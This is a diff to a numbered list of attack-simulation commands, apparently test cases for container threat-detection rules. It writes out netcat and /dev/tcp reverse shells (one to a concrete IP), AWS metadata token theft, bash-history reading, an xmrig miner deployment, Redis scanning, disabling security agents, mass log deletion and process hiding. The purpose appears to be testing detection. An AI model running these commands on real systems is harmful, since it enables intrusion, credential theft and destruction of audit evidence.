@@ -1,4 +1,6 @@
 1. Exploit vsftpd Vulnerability --need to write yaml for this
+#This command creates shell process from vsftpd. This is not exact use case of vsftpd. For time being, we have created this.
+cp /bin/bash vsftpd; ./vsftpd -c /bin/sh
 ------------------------------------------------------
 2. Credential access bash history'
 cat /.bash_history
@@ -9,7 +11,7 @@ TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metad
 && curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/
 ------------------------------------------------------
 4. 	CryptoMiner Execution
-Deploy the  kubernet pod.yml
+Deploy the  kubernet pod.yml or run command:
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -30,6 +32,9 @@ spec:
       containers:
       - name: miner-test
         image: miningcontainers/xmrig:latest
+
+command:
+/bin/sh -c "/sbin/modprobe msr allow_writes=on > /dev/null 2>&1\
 ------------------------------------------------------
 5. Network scanning utility
 /usr/local/bin/pnscan -t512 -R 6f 73 3a 4c 69 6e 75 78 -W 2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a 221.0.0.0/16 6379
@@ -56,7 +61,7 @@ service bcm-agent stop
 service aegis stop 
 ------------------------------------------------------
 11. clear system logs
-rm /var/log/syslog
+rm /var/log/syslog; rm /var/log/messages; rm /var/log/auth.log; rm /var/log/secure; rm /var/log/boot.log; rm /var/log/maillog; rm /var/log/mail.log; rm /var/log/kern.log; rm /var/log/dmesg; rm /var/log/faillog; rm /var/log/cron; rm /var/log/daemon.log; rm /var/log/btmp; rm /var/log/mysqld.log; rm /var/log/mysql.log; rm /var/log/xferlog; sleep infinity
 ------------------------------------------------------
 12. Process hidden using mount hidepid
 mount -o bind /empty/dir /proc/42
@@ -67,13 +72,16 @@ mount -o remount,hidepid=2 /proc
 curl -x socks4://proxy.example.com http://www.example.com/
 ------------------------------------------------------
 14. Process Execution from Memory
-https://stackoverflow.com/questions/63208333/using-memfd-create-and-fexecve-to-run-elf-from-memory
+#reference link: https://stackoverflow.com/questions/63208333/using-memfd-create-and-fexecve-to-run-elf-from-memory
+#currently, seperate container is created to pull the image: "angelrita/memfd-exec:latest". But, poc binary is also present in base-ubuntu image. we can just run following commmand. 
+./memfd-exec
 ------------------------------------------------------
 15. Netcat Reverse Shell Execution
-nc -e /bin/sh attackers_ip attackers_port
-bash -i >& /dev/tcp/attackers_ip/attackers_port 0>&1
+command:
+nc -e /bin/bash 10.113.107.226 4444
 
-In details:
+There are many other variations are covered in the rule.
+details:
 Inside container:
 //////////////////
 FROM alpine:latest
